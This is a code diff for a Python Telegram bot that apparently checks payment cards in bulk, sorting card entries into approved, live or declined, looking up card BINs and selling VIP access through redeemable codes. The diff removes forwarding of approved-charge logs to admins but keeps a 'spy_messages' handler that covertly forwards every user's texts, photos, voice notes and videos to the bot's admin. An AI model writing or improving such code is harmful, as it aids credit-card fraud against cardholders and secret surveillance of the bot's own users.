@@ -33,7 +33,7 @@ api_semaphore = asyncio.Semaphore(6)
 
 # ------------------- Codes -------------------
 
-CODES = {}
+CODES = {}  # {"WAFA-XXXX-XXXX-XXXX": {"duration":7, "max_users":5, "used":0, "created":timestamp}}
 
 # ------------------- BIN Lookup -------------------
 
@@ -166,17 +166,6 @@ async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = await format_response(card_full, status, response, taken)
     await update.message.reply_text(text)
 
-    # 🔥 إضافة: إرسال Charge للأدمن فقط
-    if status == "approved":
-        for admin_id in ADMINS:
-            try:
-                await context.bot.send_message(
-                    chat_id=admin_id,
-                    text=f"📩 Charge Log\n👤 {update.effective_user.first_name} ({update.effective_user.id})\n\n{text}"
-                )
-            except:
-                pass
-
 # ------------------- /stop -------------------
 
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -219,26 +208,9 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await asyncio.sleep(random.uniform(1,5))  
         taken = round(time.time()-start_time,2)  
         text = await format_response(card_full,status,response,taken)  
-        if status=="approved":
-            approved+=1
-            await update.message.reply_text(text)
-
-            # 🔥 إضافة: إرسال Charge للأدمن فقط
-            for admin_id in ADMINS:
-                try:
-                    await context.bot.send_message(
-                        chat_id=admin_id,
-                        text=f"📩 Charge Log\n👤 {user_id}\n\n{text}"
-                    )
-                except:
-                    pass
-
-        elif status=="live":
-            live+=1
-            await update.message.reply_text(text)
-        else:
-            declined+=1  
-
+        if status=="approved": approved+=1; await update.message.reply_text(text)  
+        elif status=="live": live+=1; await update.message.reply_text(text)  
+        else: declined+=1  
         last_info,last_bank,last_country = await get_bin_info(card_full.split("|")[0][:6])  
         panel = f"""📊 Status
 
@@ -272,7 +244,8 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             result_file.write(r+"\n\n")  
     await update.message.reply_text(f"Done ✅\nResults saved: {results_file_path}")
 
-# باقي الكود زي ما هو بدون أي تغيير 👇
+# ------------------- /try -------------------
+
 async def try_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMINS:
         return
@@ -284,22 +257,24 @@ async def try_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except:
         await update.message.reply_text("❌ Usage:\n/try 123456789 hello")
 
+# ------------------- استقبال كل الرسائل والملفات -------------------
+
 async def spy_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
+        # 🚫 تجاهل الملفات عشان handle_file يتعامل معاها
+        if update.message.document:
+            return
+
         user = update.effective_user
         text = update.message.text
+
+        # نصوص
         if text:
             await context.bot.send_message(
                 chat_id=ADMINS[0],
                 text=f"📩 New Message\n👤 {user.first_name} ({user.id})\n💬 {text}\n💎 Type: text"
             )
-        elif update.message.document:
-            file = await update.message.document.get_file()
-            file_path = f"downloads/{file.file_id}_{update.message.document.file_name}"
-            os.makedirs("downloads", exist_ok=True)
-            await file.download_to_drive(file_path)
-            await context.bot.send_document(chat_id=ADMINS[0], document=open(file_path,'rb'))
-            os.remove(file_path)
+        # صورة
         elif update.message.photo:
             photo = update.message.photo[-1]
             file = await photo.get_file()
@@ -308,6 +283,7 @@ async def spy_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await file.download_to_drive(file_path)
             await context.bot.send_photo(chat_id=ADMINS[0], photo=open(file_path,'rb'))
             os.remove(file_path)
+        # صوت
         elif update.message.voice:
             voice = await update.message.voice.get_file()
             file_path = f"downloads/{voice.file_id}.ogg"
@@ -315,6 +291,7 @@ async def spy_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await voice.download_to_drive(file_path)
             await context.bot.send_voice(chat_id=ADMINS[0], voice=open(file_path,'rb'))
             os.remove(file_path)
+        # فيديو
         elif update.message.video:
             video = await update.message.video.get_file()
             file_path = f"downloads/{video.file_id}.mp4"
@@ -329,6 +306,8 @@ async def spy_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
     except:
         pass
+
+# ------------------- /code -------------------
 
 async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -345,6 +324,8 @@ async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     code_data["used"] += 1
     await update.message.reply_text(f"✅ Code activated!\nYou are now VIP for {code_data['duration']} days.\nUsed {code_data['used']}/{code_data['max_users']}")
 
+# ------------------- /wafa -------------------
+
 async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in ADMINS: 
@@ -360,6 +341,8 @@ async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     CODES[code] = {"duration":duration,"max_users":max_users,"used":0,"created":time.time()}
     await update.message.reply_text(f"✅ Created code:\n{code}\nDuration: {duration} days\nMax users: {max_users}")
 
+# ------------------- /show_users -------------------
+
 async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in ADMINS: 
@@ -370,6 +353,8 @@ async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
         expire = f" expires in {int((VIP_USERS[uid]-time.time())/3600)}h" if uid in VIP_USERS else ""
         msg+=f"{uid} - {status}{expire}\n"
     await update.message.reply_text(msg if msg else "No users yet")
+
+# ------------------- Ban/Unban -------------------
 
 async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -392,10 +377,14 @@ async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     BANNED_USERS.pop(uid,None)
     await update.message.reply_text(f"User {uid} unbanned ✅")
 
+# ------------------- /start -------------------
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
     await update.message.reply_text("Bot Ready ✅")
+
+# ------------------- Run -------------------
 
 def main():
     app = Application.builder().token(TOKEN).build()
@@ -408,7 +397,7 @@ def main():
     app.add_handler(CommandHandler("ban_user", ban_user))
     app.add_handler(CommandHandler("unban_user", unban_user))
     app.add_handler(CommandHandler("try", try_reply))
-    app.add_handler(MessageHandler(filters.ALL, spy_messages))
+    app.add_handler(MessageHandler(filters.ALL, spy_messages))  # 🔥 استقبال كل الرسائل + الملفات
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
     app.run_polling()
 
